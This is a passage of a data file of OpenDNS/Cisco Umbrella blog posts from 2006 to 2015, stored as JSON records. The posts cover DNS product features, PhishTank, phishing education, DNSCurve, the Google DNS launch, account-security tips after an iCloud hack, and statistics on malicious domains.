expand to other countries in EMEA. Stewart believes that OpenDNS’s services are differentiated and show value to customers in any country around the world. “It’s about taking the unique intelligence and the data and really bringing it to the forefront to provide security,” he said. “There are few companies that actually do that, and OpenDNS can consider itself as one of those few.” “These qualities stand for the world. There are no barriers for cybercrime, so there should be no barriers for cybersolutions.”", "date": "2015-06-17"},
{"website": "Cisco-Umbrella", "title": "SmartCache: the best reason yet to switch to OpenDNS", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/smartcache-the-best-reason-yet-to-switch-to-opendns", "abstract": "Today we announced one of the most significant DNS innovations of the last 25 years. SmartCache, our new DNS record-handling technology, renders frustrating authoritative DNS outages irrelevant for OpenDNS users. It’s both incredibly simple and invaluable to Internet users. Here’s how it works: When an authoritative DNS provider suffers an outage, all of the Web sites it provides service to are taken offline. They’re inaccessible for everyone on the Internet. But no longer for OpenDNS users. Our servers will now immediately look for the last known good address for the site in our caches, and use that to load the site. So effectively OpenDNS users will be able to access Web sites that appear down for everyone else. For our millions of users at businesses, schools and libraries around the world, saving them Internet access interruptions and the time they waste is invaluable. Authoritative DNS outages happen frequently and can be a big problem. Just a few weeks ago, it’s reported that major authoritative DNS provider UltraDNS suffered an outage that took Salesforce.com, Amazon.com and Petco.com offline for several hours. In such a case, SmartCache would fix the inaccessibility problem and allow people to visit the sites through the outage. This is just the latest in a long series of DNS innovations we’ve developed and passed on to you. Most recently it was blocking the Conficker worm from phoning home. By blocking the domain names the worm used, we were and continue to be able to protect people around the globe. Trust that we’re committed to continue to innovate and give you easy-to-use services that make your Internet experience better. SmartCache is available immediately as an opt-in feature. Just log in to your dashboard and look for the check box in your Advanced Settings. For those tech geeks, this only applies to queries where the authoritative server hands back a SERVFAIL response code in addition to any query that simply goes unanswered. Let us know what you think of the new feature in the comments here.", "date": "2009-04-24"},
{"website": "Cisco-Umbrella", "title": "How to be sure a domain is resolving correctly: CacheCheck", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/cachecheck", "abstract": "If you wonder what’s in the OpenDNS cache for a domain, take a look. If you want OpenDNS to refresh its cache for a domain, use CacheCheck to do it yourself. Background on CacheCheck Because we’ve seen such vibrant adoption (thanks!), OpenDNS has established itself as the leader in recursive DNS services. People expect more from a leader, as they should. So, when a domain doesn’t resolve — especially one they’ve visited successfully before — users are quick to ask us “What’s wrong? Why does ‘insert-domain-name-here’ not resolve?” Example, CacheCheck results We welcome these questions: our entire company is built around getting you where you want to go on the Internet as fast as possible and as reliably as possible. If there’s a problem we can fix, we want to know about it immediately. But we’re not responsible for the entire DNS; we’re just a visible link in the chain. When a valid domain is not resolving, there are two common possibilities: the domain is being moved, and the old address is still cached since the Time-To-Live (TTL) has not expired the domain’s nameservers are not responding For #1, CacheCheck lets you fix the problem immediately. OpenDNS has a huge cache to help make your Internet experience faster. OpenDNS usually holds an address for the full TTL (never longer!!). So, if a domain has been moved without lowering the TTL first, we may have the old address cached. CacheCheck, please! (groan) We can’t do anything about #2 yet, but we can make the situation clear both to the domain owner and the would-be website visitor. CacheCheck came from an internal tool we built to let us peek into our cache, and selectively clear it. Today, that unique functionality is available to everyone. No one else offers this kind of control and insight. You can ask any recursive DNS server for an address, but if the answer is wrong, there’s no recourse and little information. Domain owners, especially, should find this first-of-its-kind tool valuable for domain management. Everything we do at OpenDNS is aimed at making the Internet better through DNS. CacheCheck is our first feature aimed squarely at domain owners. Fortunately, anyone who visits a website benefits, too. P.S. For the record, OpenDNS always suggests lowering TTL before migrating a domain to a new server. But we understand that domain migrations are not always planned, so CacheCheck can help domain owners out of a BIND (bad DNS humor).", "date": "2006-12-19"},
{"website": "Cisco-Umbrella", "title": "Why I Started OpenDNS", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/why-i-started-opendns", "abstract": "I’m a little late to the blogging phenomenon, but here we go. I started working on OpenDNS last November to create a new kind of DNS service that can be used by anyone to make their Internet experience better. Since then I’ve been working hard to bring this to fruition by assembling a fantastic team, developing some really great software and deploying a world-class network. Now I’m thrilled to introduce the free service we’ve been building. It’s ready, and I want you to try it. You will love it. DNS in two (or three) sentences DNS is what allows you to type in a web address and end up at a website; DNS is transparent and yet fundamental to the operation of the Internet. There are two sides to DNS, the authoritative side which give out answers and the recursive side that ask questions on your behalf and holds onto them in case you ask again. OpenDNS provides the latter, the world’s first highly-available, high-performance recursive DNS service customized with features to make the Internet safer, faster and smarter for you. (Clearly, I belong in Marketing.) Some background To understand why I created OpenDNS requires a little background. I’d moved to San Francisco after graduating from Washington University in St. Louis, and was managing EveryDNS, a popular and reliable DNS management service which I started five years ago. While helping scale and run operations for a startup run by a friend of mine I watched EveryDNS continue to grow and do well on its own and I missed it. Running a world-class DNS service for five years taught me a lot not only about DNS and networks but also about the people who use them. As a result of all this work I discovered ways to make DNS better by making it more resilient, safer and faster. I also began to see and understand how a lot of spam, spyware and phishing sites abused DNS to operate. Not everyone on the Internet is as nice as you are Spammers, Phishers, Botmasters and other Internet Bad Guys use DNS as a vector for running their attacks and schemes to send spam, spread malware and operate phishing sites. Some of these Bad Guys used EveryDNS to manage DNS nefariously. When I found out about this, I took action and cleaned up EveryDNS. We wrote code to filter out the Bad Guys and began collaborating with other DNS providers to share information on bad users and bad domains so that these bad actors would be unable to jump from service to service. The Bad Guys went away and my part of the Internet was clean (and still is). The problem was that the Bad Guys just moved onto easier targets — other DNS services that didn’t care as much as I did and didn’t collaborate with the major DNS players. The abuse continued to be levied on the Internet and I was unable to stop it. By cleaning up my neighborhood all I had done was drive the abuse into another one. So I created OpenDNS to deal with this and many other limitations of the existing DNS. OpenDNS is a DNS service designed for you : instead of relying on all the unknown DNS providers out there to clean up their act (more on this in a future post), we act like a crossing guard in front of your house. We direct the good stuff towards you and send the bad stuff away. Improving the DNS DNS — the Domain Name System, a foundation of the Internet for 20 years — has loads of room for improvement. Most people don’t realize the possibilities, but the DNS software most of us are using (via an ISP or corporate server) hasn’t evolved fast enough or far enough from the software written in the 1980s. There’s a huge opportunity to learn from the past and address and fix some of the problems that crop up at the scale of today’s Internet. I decided that adding security features, performance improvements (we all want a faster Internet, even with broadband), and some smarts (fix typos for me… that’s what computers are supposed to do) would evolve the existing DNS without breaking the old. Don’t worry about us hijacking your traffic like one of the many browser toolbars that get automatically installed — having had my first tastes of unix and networking at a mom-and-pop ISP, I was schooled with the importance of making things interoperate nicely and not messing with peoples’ computers or Internet. Improving the Internet What do I mean by “improve the Internet”? If you’ve read ” The Tipping Point ” by Malcolm Gladwell you know the story about how New York City made the subways safer by focusing on the fundamentals rather than trying to catch every criminal. By cleaning up subway graffitti and catching fare-cheaters the law-abiding citizens of New York returned to using the subways and to taking pride in their clean city. These small changes led to a massive downturn in crime numbers in New York. We’re applying the same techniques to the Internet and cleaning it up. We’re blocking phishing sites that are set up to steal your banking and other sensitive data. We’re impacting the ability for botnets to organize and disrupt networks. We’re improving the collective intelligence of the DNS to provide insights into many forms of Internet abuse and fraud. More than five years running EveryDNS showed me a lot of the shady practices by the folks who have made phishing, pharming, botnets, spamming, and other nefarious practices something we all contend with every day. (Who thought phishing would be a widespread term?) They do this because it’s easy for them and there are no counter-measures. Now there’s OpenDNS. Of course, we’ll also speed up your Internet without changing your ISP, computer, or browser and perform some simple but useful tweaks like fixing typos. A barrage of testing and feedback has told us that people really notice a faster Internet experience, and that they appreciate getting an intelligent search results page rather than a “page not found” error. That is just the beginning. EveryDNS The primary service of EveryDNS is free authoritative DNS. Not registering domains, not hosting websites, not doing anything more than let people with domains administer their own records in the global Internet “white pages” known as DNS. Nearly 100,000 individuals, organizations and companies depend on this free resource and have for many years. EveryDNS is supported by donations and advertising, and has always been profitable. I have automated nearly ever aspect of EveryDNS and along with the help of a fantastic team of volunteers, I am free of day-to-day involvement. Personal history You can check out my personal website at david.ulevitch.com . I’m a DNS expert and I live in San Francisco. If you have any questions, please get in touch.", "date": "2006-06-28"},
{"website": "Cisco-Umbrella", "title": "How to enable SmartCache for your network", "author": ["Allison Rhodes"], "link": "https://umbrella.cisco.com/blog/how-to-enable-smartcache-for-your-network", "abstract": "A few weeks ago we made the decision that SmartCache, one of OpenDNS’s most significant DNS caching innovations, would be available for free to all of our 15 million users around the world, regardless of which version of the service you’re using. SmartCache keeps track of the last known good IPs for Web sites that are experiencing an authoritative DNS outage and hands them back instead of returning no answer.  In many cases, the IPs associated with the web server or other services you are trying to reach work just fine and the Web site loads successfully.  Without SmartCache, it’d feel like the site was down.  So in effect, SmartCache makes Web sites that are down and unreachable for the rest of the Internet load for OpenDNS users. In order to take advantage of SmartCache, you still need to take action and enable it on your network .   Here’s how to do it: Log in to your OpenDNS account. Go to the Settings tab. Select the network you want to enable SmartCache for. Choose Advanced Settings. Select “Enable SmartCache on this Network” at the top. That’s it.  Just five steps. We encourage you to take a few minutes and enable it since it’s such a fantastic feature.", "date": "2009-12-01"},
{"website": "Cisco-Umbrella", "title": "Some thoughts on Google DNS", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-google-dns", "abstract": "Google launched a DNS service today , almost exactly four years after I started OpenDNS.  This comes as no surprise as it was only a matter of time before one of the Internet giants realized the strategic importance of DNS.  I’ve received a lot of questions from bloggers, journalists, friends and most importantly, our users. And so I want to share my thoughts on what this means for the recursive DNS space and what it means for OpenDNS. First , it’s not the same as OpenDNS.  When you use Google DNS, you are getting the experience they prescribe.  When you use OpenDNS, you get the Dashboard controls to manage your experience the way you want for you, your family or your organization. People use OpenDNS because we are pioneers and innovators in the DNS space, offering the most secure recursive DNS service around.  We run the largest DNS caches, the fastest resolvers, and we offer the most flexibility in controlling your DNS experience.   For example, IT folks want to block malware in the DNS, parents sometimes want to block certain content from kids.  All of that and more is possible with our DNS. It is not with Google DNS.  Of course, we don’t force those things, we offer them as controls that you manage the way you see fit. Providing people with choice is core to our offerings. Second , it means that Google realizes that DNS is a critical piece of our Internet’s infrastructure and that it’s of strategic importance to help people safely and reliably navigate the Internet.  This is something we’ve championed since day one and will always keep as our primary mission.  This is why big enterprise customers are switching to OpenDNS too, not because it’s free but because it’s the best and we add value to DNS and improve the security of their networks. Third , Google claims that this service is better because it has no ads or redirection.  But you have to remember they are also the largest advertising and redirection company on the Internet.  To think that Google’s DNS service is for the benefit of the Internet would be naive.  They know there is value in controlling more of your Internet experience and I would expect them to explore that fully.  And of course, we always have protected user privacy and have never sold our DNS data.  Here’s a link to our privacy policy . Fourth , it means that Google is bringing awareness to a wide audience that there is a choice when it comes to DNS and that users don’t have to settle for what their ISP provides.  And we believe that having choice is a good thing — just as Internet users have unbundled their email to services like Gmail, Yahoo! Mail and Hotmail people have been unbundling their DNS and switching to OpenDNS in huge numbers for the last 3+ years because we’re better. Fifth , it’s not clear that Internet users really want Google to keep control over so much more of their Internet experience than they do already — from Chrome OS at the bottom of the stack to Google Search at the top, it is becoming an end-to-end infrastructure all run by Google, the largest advertising company in the world.  I prefer a heterogeneous Internet with lots of parties collaborating to make this thing work as opposed to an Internet run by one big company. So how will this impact us?  It’s too early to tell, but largely I think this is a good thing for us.  Google DNS currently offers none of the choice and flexibility that our service does. It’s new and untested. Having said that, it encourages us to keep making our service better.  And ultimately, we’re a business that has been growing aggressively since we launched and has been competing in fair markets and winning.  It raises awareness about the importance of DNS and it motivates us to continue providing world-class services to a global audience and to keep innovating. We will continue to do that without distraction from Google or any of the other players in the DNS or security space. But we welcome Google to the neighborhood.", "date": "2009-12-03"},
{"website": "Cisco-Umbrella", "title": "Milestone: 20 billion DNS queries in 24 hours", "author": ["Allison Rhodes"], "link": "https://umbrella.cisco.com/blog/20-billion-queries", "abstract": "Yesterday we hit a milestone big enough and important enough to share.  In just 24 hours we successfully answered more than 20 billion (!) DNS queries, doubling the number we handle per day since April of this year when we announced 10 billion. Why is this important?  Because our rapid and steady growth is an indication of the demand for a rock-solid reliable and intelligent DNS service that not only makes your Internet faster and more reliable, but safer and smarter too. We now have more than 15 million users around the world.  More than 25,000 schools in the U.S. choose OpenDNS to keep their kids safe online, and included in that number are some of the country’s largest school districts.  Companies ranging from small mom-and-pop shops to Fortune 100 enterprises are switching in droves to OpenDNS for Web content filtering, DNS security and DNS resolution. 2009 was an exceptional year for OpenDNS, but the next year is poised to be even better. In 2010 we’ll be adding more server locations and more server capacity to make our international coverage even better. We’ll give you new features that allow more customization of how OpenDNS works for you.  And, we’ll work hard to keep DNS innovation synonymous with OpenDNS. Thanks for helping us get to 20 billion.  I’m confident 50 billion is closer than it may seem. 🙂", "date": "2009-12-16"},
{"website": "Cisco-Umbrella", "title": "Block Page Bypass available in OpenDNS Enterprise", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/block-page-bypass", "abstract": "Today we’ve announced the immediate availability of Block Page Bypass , an innovative feature that allows the granting of special permissions to bypass OpenDNS filtering without the use of any software or any appliance. The announcement is significant because it makes OpenDNS Web content filtering a fitting service for a much wider group of companies and organizations. Since our Web content filtering began growing in popularity years ago, we’ve heard from potential customers that one of the only hurdles to adoption is the lack of a Block Page Bypass feature. The cost savings and ease-of-use of our service make a very compelling switch-from-Websense or Blue Coat-argument, but for some potential customers, the inability to assign different people the permission to bypass specific categories or websites made our solution unusable in their organization. For those customers, we’re proud to have a solution available today that will liberate them from the high cost and frustrating experience of managing on-premise filtering appliances. In building this feature we looked at how the appliance vendors perform this function today and realized right away that their approach is highly inefficient. In order to allow you to bypass one site, they often have to proxy all traffic through their appliance. Anyone who has run a network or managed a filtering box knows this slows down the network significantly and introduces a single point of failure. The approach we’ve developed is no less intelligent than what you’ve come to expect from OpenDNS. We proxy only the sites being bypassed, so in effect we give you more granular filtering without decreasing overall performance. The idea that better security should not impact performance is a theme we talk about a lot internally and is something we think about with everything we do. Right out of the gate this feature is available to all OpenDNS Enterprise customers, but later this year will be available in Deluxe as an add-on.", "date": "2010-02-16"},
{"website": "Cisco-Umbrella", "title": "OpenDNS adopts DNSCurve", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/opendns-dnscurve", "abstract": "Editor’s note: Below is a fairly technical post from OpenDNS engineer and noted security researcher Matthew Dempsky introducing DNSCurve and sharing some thoughts on DNSSEC. Readers of this blog know Matthew has been credited with finding vulnerabilities in both Adobe Flash Player and djbdns. Everyone in the DNS community agrees that DNS’s security model is woefully outdated. Conceived at a time when there were fewer computers on the Internet than are housed by even today’s smallest data centers, DNS unfortunately has no strong protection against malicious parties hoping to exploit web users. What little protection it does offer is mostly derived from novel uses of non-security features (e.g., UDP source port and transaction ID randomization). For more than 15 years, the IETF has been working on DNSSEC, a set of extensions to apply digital signatures to DNS. Millions of dollars in government grants and several reboots from scratch later, DNSSEC is just starting to see real world testing. And that testing is minimal — only about 400 of the more than 85,000,000 .com domains support DNSSEC, fewer than 20% of US government agencies met their mandated December 31, 2009 deadline for DNSSEC deployment, and only two of the thirteen root zone name servers is testing with even dummy DNSSEC data. Aside from its lack of adoption, DNSSEC isn’t even a very satisfactory solution. It adds tremendous complexity to an already fragile protocol, significantly increases DNS traffic in size, encourages questionable security practices, and hamstrings many modern uses of DNS. Details Complexity: DNSSEC has many options for enabling/disabling DNSSEC validation, with conflicting interpretations of how to handle different bits; considering people still disagree about how to handle features of DNS that have been present since its inception, I foresee these won’t be resolved anytime soon. DNS traffic: Responses right now are usually limited to 512 bytes, sometimes a little more. DNSSEC enabled responses regularly exceed 1500 bytes, requiring IP fragmentation or fallback to TCP. IP fragmentation frequently fails with misconfigured firewalls and using TCP is much slower than the default UDP transport. Questionable security practices: Most users are encouraged to use 512-bit or 1024-bit RSA keys. A group of hobbyists recently worked together to break all of the 512-bit keys used by Texas Instruments for signing their calculator firmware and they did so quickly and easily. The RSA company and NIST have been recommending users switch to 2048-bit keys since 2003 and 2007, respectively. Again, unfortunately, the DNSSEC standards developers are hesitant because bigger crypto is slower, and it will further push the traffic size issue. Hamstrings modern uses: High traffic DNS servers can’t handle signing every response packet, so they need to pre-compute signatures. This limits how companies like Akamai and Google or projects like the NTP Pool can use DNS for global load balancing and routing users to their nearest servers. It also fundamentally hampers services like OpenDNS, which use DNS to provide content filtering and search services. Efficiency: RSA is a very slow crypto standard; its only benefit is that everyone knows about it. DNSSEC can theoretically support other crypto standards, but the IETF has largely ignored efforts from interested parties to add support for faster and stronger algorithms. So while debate about DNSSEC wears on, we’re excited to announce that OpenDNS has fully adopted another proposed DNS security solution: DNSCurve . DNSCurve is a recent DNS extension proposal that is fully backwards compatible with the existing DNS protocol, uses much stronger cryptography than DNSSEC, and most importantly, is much simpler and much easier to implement and manage. The most significant technical distinction is that DNSSEC uses large and slow per-recordset signatures while DNSCurve uses small and fast per-packet encryption and authentication. OpenDNS’s DNS resolvers already fully support DNSCurve today and use it whenever possible. Of course, authoritative servers need to be upgraded to support DNSCurve as well, but it’s our hope that this announcement will help to get the ball rolling on DNSCurve adoption. If you’re an authoritative DNS provider and are interested in deploying DNSCurve, we’re interested in hearing from you. Editor’s note: Our support for DNSCurve doesn’t prevent our adoption of DNSSEC — they are not mutually exclusive. While we have reservations about DNSSEC, we can and will implement it when we see more demand and traction, but in the meantime, when we see a viable technology that can be quickly implemented to improve security for DNS users, that’s a no-brainer in our book.", "date": "2010-02-23"},
{"website": "Cisco-Umbrella", "title": "New feature today: Time Zone Preferences", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/time-zone-preferences", "abstract": "This morning we enabled time zone preferences in your OpenDNS account, allowing you to set your account to use your local time zone. This is significant because until now, all of your stats appeared in Pacific Standard Time (PST).  The enhancement affects all charts, graphs and logs in your OpenDNS account, including but not limited to timestamps on malware alerts and DNS stats — which makes data like Top Domains and Blocked Domains much more useful. Here’s how the change came about: Three separate people submitted the idea to IdeaBank, the area in the OpenDNS community where anyone can suggest new feature and service enhancement ideas.  Then 1,160 other people voted up the idea, indicating that they’d also like to see it come to fruition.  As a company, everyone pays attention to IdeaBank and we took note of the mounting support for the idea. Because you told us you wanted it, we decided to build it into the service. If you have ideas for other features and enhancements you’d like to see, I encourage you to speak up and let us know. Or take a stroll through IdeaBank and vote on other people’s ideas that you think are great. This is how the system works, and how we’re able to focus on building those features that we know you want. If you want to enable time zone preferences in your account, go to the My Account tab in your dashboard and choose “edit account info.” Select your region of the world, followed by the closest major city. The change will take effect immediately.  Kudos to OpenDNS Engineer Cory Krug for making this happen. 🙂", "date": "2010-05-13"},
{"website": "Cisco-Umbrella", "title": "Milestone: 1 Million Phishes Submitted to PhishTank", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/milestone-1-million-phishes-submitted-to-phishtank", "abstract": "When OpenDNS launched PhishTank four years ago in Oct. 2006, we knew several things: We wanted to make a clearinghouse for phishing data. We wanted the data to be available for free to other services via an API. There was no existing common source of phishing data that was fast-moving, accurate and reliable. Today I’m excited to announce that the 1 millionth phish has been submitted to PhishTank. The “winning” submission was a fake Citibank UK website , which was quickly verified by the PhishTank community. Thank you to the thousands of security pros, researchers, academics and concerned Internet users for their contributions to PhishTank. It’s you who have made this possible. You’ve protected tens of millions of people around the world, lending your expertise to help take the guesswork out of identifying phishing scams. It’s a credit to the community that we’ve reached this milestone. And in doing so, we’ve together helped protect not only people who use OpenDNS, but millions more, since the phishing scams reported and verified are also blocked by all of the Internet services PhishTank shares the data with. As we look toward the next 1 million submissions to PhishTank (happening even more quickly), we know it’s just as important today as it was when we launched in 2006 to ensure that PhishTank continues to be the comprehensive data source companies like Yahoo and Mozilla have come to rely on. The community is an extremely important part of this, so part of recognizing the 1 million phishes milestone is recognizing the people who’ve put in the hard work. The other part is, of course, the technology that keeps PhishTank running. Over the past two weeks we’ve begun deploying all new hardware for PhishTank’s infrastructure. And, in the coming months, we’ll devote increased engineering resources to it, as well. The goal is that these enhancements and investments will make PhishTank easier to use for the community of dedicated submitters and verifiers, and also faster-moving for the companies and organizations pulling data out.", "date": "2010-08-13"},
{"website": "Cisco-Umbrella", "title": "New Feature: Greater Block Page Customization", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/new-feature-greater-block-page-customization", "abstract": "Starting today, all OpenDNS network administrators can choose whether or not they’d like to include a link to “Contact your network administrator” on the block page that pops up when users on your network try to access restricted content. Why the change? We heard from a number of you that the emails you received from the block page weren’t something you wanted to read. Based on that feedback, we decided to give you the choice of whether you wanted to receive these messages or not. By default, we’ve left the link there, but you can turn it off by visiting the Settings tab in the Dashboard, selecting a network, and clicking on the Customization link. There, you’ll see a checkbox in the “User Feedback” section titled, “Show Contact Admin Form.” At OpenDNS, we’re always focused on empowering our users through advanced customization options, whether it be the 50+ web content filtering categories, or incremental improvements like this one. If you have any ideas about how we can help you better personalize OpenDNS, let us know in the IdeaBank!", "date": "2010-09-10"},
{"website": "Cisco-Umbrella", "title": "The phish that almost duped PhishTank. Almost.", "author": ["Allison Rhodes"], "link": "https://umbrella.cisco.com/blog/the-phish-that-almost-duped-phishtank-almost", "abstract": "OpenDNS runs PhishTank.com , the largest clearinghouse of phishing data on the Internet.  So we’re often the first to see new, particularly sneaky phishing attacks. The one we’re sharing with you today is both of those things. At the surface, this scam looks like hundreds of thousands of others we’ve seen over the years. It impersonates an HSBC Bank website and encourages people to enter their login credentials, which would then, presumably, be stolen and used nefariously. While any kind of phishing is gross, it’s what’s happening behind the scenes here that’s particularly alarming. Simply put, the scam actually turns 404 errors into phishing websites. So this phishing website returned 404 headers to your browser, which normally tell your browser that the website you’re trying to load is down or can’t be found.  Instead of saying a page couldn’t be found, their “error” page just looked like HSBC Bank’s website to visitors. The reason this is especially crafty is that it completely circumvents one of the primary ways PhishTank tests if a phish is still live and functional, which is watching for 404 errors. Normally a 404 would only be returned after the offending website was fixed, indicating the content is no longer available.  However, a website administrator can put whatever content they want on their 404 error page.  This is exactly what we saw happen. By returning a 404 error, but still rendering the phish, the website administrator avoided being caught by Phishtank. But not for long. Our exceptional community of security researchers, IT professionals and academics, quickly identified the phish and verified it, blocking it for more than 30 million people around the world instantly. And OpenDNS engineering is working now to update the way PhishTank works to make sure we catch these types of phishes without delay going forward. The moral of the story here, and the moral to every story about Internet security: the bad guys are crafty and constantly trying new ways to trick Internet users. Security companies like OpenDNS need to be vigilant and work with the security community to quickly react to threats and always stay ahead of the bad guys.  You can bet we will continue to do just that. Update: The phishes referenced in this post were submitted by PhishTank community member Michael Molsner , who works for Kaspersky Lab.", "date": "2011-09-28"},
{"website": "Cisco-Umbrella", "title": "Can you spot a phishing site? Take our quiz to find out.", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/can-you-spot-a-phishing-site-take-our-quiz-to-find-out", "abstract": "Update: We’ve created a new version of the phishing quiz that now includes URLs and feedback on why some seemingly legit sites are actually phishes. Take the quiz again to see how well you do. Could you be duped by a phishing scam? Most of us familiar with the usual phishing tactics tend to think we’re skilled at recognizing scam sites. But as phishing becomes increasingly sophisticated, it’s getting harder and harder to distinguish real sites vs. scams. If you’re using OpenDNS, you and yours are protected from phishing sites. We use data from PhishTank — which we operate — the largest clearinghouse of phishing data online. But even with OpenDNS, the single best defense against phishing is education. Knowing how to spot a phish means you’re less likely to click a phishing link in the first place. With the holiday season upon us, what better time than now to brush up on phish-spotting skills? We crafted a quiz that asks you to identify whether 10 homepage images are those of real or phishing websites. Consensus is that showing the URLs for the sites makes the quiz too easy, so we’ve hidden them. A quick refresher on spotting phishing before you get started: Take the quiz now!", "date": "2011-11-16"},
{"website": "Cisco-Umbrella", "title": "Phishing Quiz v2.0 – Can you spot a phish?", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/phishing-quiz-v2-0-can-you-spot-a-phish", "abstract": "One of our most important goals at OpenDNS is educating people on Internet dangers so they can make informed choices on how to best manage their networks. Last week we released a phishing quiz, hoping we could show people just how difficult it is to spot the difference between a phishing site and the real website. The quiz was designed to be difficult, but our users were hoping for something more than a challenge. The comments poured in, encouraging us to create a powerful educational tool that you could use to help teach people how to avoid getting phished. You had our attention. Many of you, who know that cyber criminals can create exact replicas of real sites by simply copying the image and hosting it at a different domain, were frustrated that the quiz didn’t include URLs. Others, hoping to use the quiz to teach friends and family about the dangers of phishing, asked us to create something that showed why seemingly legit sites were actually phishes. So, we incorporated your feedback into a new version of the quiz. We hope you’ll find this to be a useful tool to help people learn the dangers of phishing, and how to avoid them. As always, the easiest way to avoid getting phished is to use OpenDNS. That’s because OpenDNS runs PhishTank, the world’s largest community-powered online clearinghouse for phishing, and uses it to automatically block phishing sites for all OpenDNS users. Take the quiz now!", "date": "2011-11-30"},
{"website": "Cisco-Umbrella", "title": "Do you use iCloud? You might want to think twice…", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/advice-to-avoid-icloud-hacking", "abstract": "A group of hackers, who identified themselves as Clan Vv3, recently hacked into Wired journalist Mat Honan’s iCloud account with the help of Apple Support. Pretending to be Honan, the hackers contacted AppleCare support to reset his password. They were able to bypass the security questions by providing Honan’s email address, billing address, and last four digits of his credit card number which they had obtained from his Amazon account. Once they gained access to his iCloud account, they proceeded to remotely wipe his iPhone, iPad, and Macbook one by one along with his Gmail account. Honan’s personal and Gizmodo Twitter profiles were also connected to his iCloud account, and therefore were also compromised in the attack. On his personal Tumblr, Honan stated that he has been in contact with Apple and Google since the attack to try to recover his data and make sure this doesn’t happen again. He also got in contact with DriveSavers, a data recovery company, who were able to recover data from his MacBook Air, making the painful situation, a little less painful. In response to the attack, Apple put a temporary freeze on over-the-phone password verification to determine what changes, if any, needed to be made to their current security policies. Amazon responded by stating it will no longer allow customers to change account settings over the phone. What can you do to protect yourself from similar attacks? For one, you can disable iCloud services on your Mac and iOS devices. But what’s the point of having a device with cloud features if you can’t use them without constantly worrying? There is a risk with everything in life, but you take the proper measures to lessen the risks by securing your cloud security with these seven useful tips: Use strong, alphanumeric passwords and change them frequently. Never use the same password for more than one service. Use two-factor authentication wherever possible. Two-factor authentication is a process in which a user provides two forms of identification to prove who they are. Common forms of identification used include security codes, bank cards, or phone numbers. Using two-factor authentication significantly reduces the probability that someone could gain access to your information. Create individual accounts for each family member instead of sharing access to prevent multiple accounts from being compromised and exposed. Always choose security questions in which the answers aren’t easily guessed or researched through public records. Always keep a local backup of your data in addition to cloud backups. Disable services such as “Find my Mac” unless you are traveling or are in a situation in which your laptop might be lost or stolen (which is unlikely if it is always kept at home). If you have any other useful tips for protecting yourself, we’d love to hear them. Please share with us in the comments below.", "date": "2012-08-23"},
{"website": "Cisco-Umbrella", "title": "Whether company-owned or BYOD, location matters when it comes to enforcing policy.", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/whether-company-owned-or-byod-location-matters-when-it-comes-to-enforcing-policy", "abstract": "One of IT’s biggest challenges is providing always-on security for devices that roam off the corporate network. But it seems like much of the time the conversation comes down to BYOD. We think the conversation is much more complex. The work-everywhere era has also given way to the work-anytime era, and that’s true regardless of whether devices are user-owned or company-owned. Users are checking email, accessing data, writing code and finalizing projects and presentations at all times of day, from wherever they work. And there’s a flip side to this. They’re also accessing the same devices they use for work for social media, online shopping and bill pay, streaming media and other personal activities. While IT admins want to ensure ubiquitous security protection, enforcing acceptable use policies for accessing inappropriate or bandwidth-heavy content may not be warranted outside of the office, especially if it means asking a user to hand over their personally-owned device. So what’s an IT admin to do? Our recent whitepaper, 7 Things You Need to Know to Secure Nomadic Workers , assesses a few of the options available today and offers best practices for deploying flexible security and policy enforcement. You can download the whitepaper , or join us for a webcast on Nov. 28.", "date": "2012-11-16"},
{"website": "Cisco-Umbrella", "title": "How likely is a domain to be malicious? Here's a look at the stats and graphs that help us decide.", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/quick-stats-and-visuals-on-the-likelihood-of-a-malicious-domain", "abstract": "Happy New Year! The landscape of security threats widened significantly in 2012. Each day, OpenDNS now blocks 80,000,000 requests to botnet, malware or phishing domains across the globe. Below you’ll find a demonstration of the densities of malicious domains in contrast with sampled benign domains at an aggregated level. The data is sorted by geo locations, TLDs, ASNs and a number of other domain attributes. TOP 30 COUNTRIES The United States (US), Germany (DE) and China (CN) are still the top three countries where the most malicious sites are hosted via the IP and network details. Countries are sorted by the total number of malicious sites in descending order. One interesting note, is that a number of countries are hosting significantly more malicious sites than benign sites, including Korea (KR), Philippines (PH), Moldova (MD), Panama (PA) and Antarctica (AQ). TOP 30 TLDs Not surprisingly, .ru, .cc and .cn are the most notorious TLDs for malicious domains. TLDs are sorted by the total number of hosted malicious sites in descending order. From the data, we can make the deduction that domains of .ms, .com.co, and .am are much more likely to be malicious than domains with a .fr. TOP 30 ASNs The top 30 ASNs shown below are sorted by the absolute number of malicious sites they host. There are a number of ASNs that are almost completely dedicated to serving malicious traffic. Lastly, in the following plot we show the statistical likelihood of a domain being malicious vs. benign according to a number of other attributes of a domain: 1) how many IPs a domain resolves to; 2) number of different countries a domain’s IP is located in; 3) the string length of a domain name; 4-6) the minimum, mean and maximum TTL of a domain; 7) & 9) the lexical perplexity of a domain name and its entropy; 8) the number of times a domain’s IP changed over a 24 days period; 10) the age of a domain. OpenDNS has processed 41 trillion DNS requests since OpenDNS started protecting its users in 2006, and we block 80+ million requests to botnet, malware or phishing domains daily for both OpenDNS users and Umbrella customers . We’re looking forward to another terrific year ahead of us.", "date": "2013-01-08"},
